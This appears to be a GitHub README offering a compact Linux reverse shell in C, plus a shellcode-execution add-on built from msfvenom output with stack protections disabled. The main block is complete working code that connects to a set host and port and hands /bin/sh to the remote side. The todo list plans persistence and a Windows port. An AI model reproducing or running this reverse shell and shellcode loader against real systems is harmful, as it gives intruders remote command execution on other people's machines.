# compact_linux_reverse_shell
A compact linux reverse shell written in the C programming language.





:warning: to myself:  update ALL reverse shells (gist, git, codes, code blocks, ....)  :warning:






### todo:
- [x] (50/100 done) `adding shellcode execution (with a short & neat guide how to get shellcode without using radare2 or the classical ghidra or metasploit utils)`
- (10/100) Windows version(on going!)
- persistence mechanism
- GIST with UPDATES



### Sources:
- stack overflow
- 



### Only reverse shell

https://gist.github.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597
```
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#define RP 1234
#define RH "127.0.0.1"
#define BIN "/bin/sh"
int main(){
int is = 0;is = socket(AF_INET,SOCK_STREAM,0);
struct  sockaddr_in s1;
s1.sin_family      = AF_INET;
s1.sin_port        = htons(RP);
s1.sin_addr.s_addr = inet_addr(RH);
connect( is,(struct sockaddr *) &s1,sizeof(s1));
for(int i=0;i<3;dup2(is,i),i++);
char * const argv[] = {BIN,NULL};
execve(BIN, argv, NULL);
return 0;}
```



## Addon 1: SHELLCODE EXECUTION

```
// gcc lin_1.c -o L1 -fno-stack-protector -z execstack -no-pie   -g
//  //  
//  msfvenom -p linux/x64/exec cmd="echo ABC \&\& echo XYZ" -f c -v sh_1
//  [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
//  [-] No arch selected, selecting arch: x64 from the payload
//  No encoder specified, outputting raw payload
//  Payload size: 57 bytes
//  Final size of c file: 265 bytes
//  unsigned char sh_1[] = 
//  "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
//  "\x66\x68\x2d\x63\x54\x5e\x52\xe8\x15\x00\x00\x00\x65\x63\x68"
//  "\x6f\x20\x41\x42\x43\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x58"
//  "\x59\x5a\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
//  //  

#include <stdio.h>
#include <unistd.h>

int main(){
  unsigned char sh_1[] = 
  "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
  "\x66\x68\x2d\x63\x54\x5e\x52\xe8\x15\x00\x00\x00\x65\x63\x68"
  "\x6f\x20\x41\x42\x43\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x58"
  "\x59\x5a\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
// (*(void(*)())XXX)();
(*(void(*)())sh_1)();
return 0;
}
```







